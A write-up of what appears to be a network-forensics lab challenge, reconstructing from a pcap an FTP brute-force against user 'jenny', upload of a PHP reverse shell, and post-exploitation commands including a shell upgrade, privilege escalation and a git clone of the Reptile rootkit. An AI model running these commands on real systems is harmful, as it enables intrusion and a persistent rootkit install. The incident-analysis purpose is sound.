@@ -1,0 +1,112 @@
+First challenge: Analyzing a .pcap using Wireshark
+
+
+In the first packets we see SYN and SYN,ACK, but not ACK to complete the connection, which is a telltale of stealth scanning.
+
+Then we see the message: 220 Hello FTP world!
+Tools like Nmap with the -sV flag (for service version detection) or banner grabbing tools like Netcat could trigger this.
+
+FTP	78	Request: USER jenny
+FTP	78	Request: PASS 12345
+FTP	81	Request: PASS password
+FTP	79	Request: PASS dragon
+
+We get this info (just showed a few passwords as there are many more) and we can tell that someone is brute-forcing using jenny's username.
+
+
+I followed the TCP stream of Login successful and:
+331 Please specify the password.
+
+PASS password123
+
+230 Login successful.
+
+
+
+
+The attacker uses the PWD command:
+400	15.576739978	192.168.0.147	192.168.0.115	FTP	71	Request: PWD
+And the current directory is: var/www/html
+
+
+
+
+
+Following the TCP stream I found more info:
+IST -la
+
+150 Here comes the directory listing.
+226 Directory send OK.
+
+TYPE I
+
+200 Switching to Binary mode.
+
+PORT 192,168,0,147,196,163
+
+200 PORT command successful. Consider using PASV.
+
+STOR shell.php
+
+150 Ok to send data.
+226 Transfer complete.
+
+SITE CHMOD 777 shell.php
+
+200 SITE CHMOD command ok.
+
+QUIT
+
+221 Goodbye.
+
+
+
+
+
+Then following the TCP stream from the FTP_DATA protocol we can find more info:
+http://pentestmonkey.net/tools/php-reverse-shell (the backdoor downloaded from the hacker)
+
+
+After that I selected a packet after executing the shell and followed the TCP stream and found some commands used by the hacker:
+whoami
+ls -la
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+su jenny
+sudo su
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+ls -la
+make
+    make[1]: Entering directory '/root/Reptile/userland'
+    Makefile:10: ../.config: No such file or directory
+    make[1]: *** No rule to make target '../.config'.  Stop.
+    make[1]: Leaving directory '/root/Reptile/userland'
+    Makefile:56: recipe for target 'userland_bin' failed
+    make: *** [userland_bin] Error 2
+root@wir3:~/Reptile# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
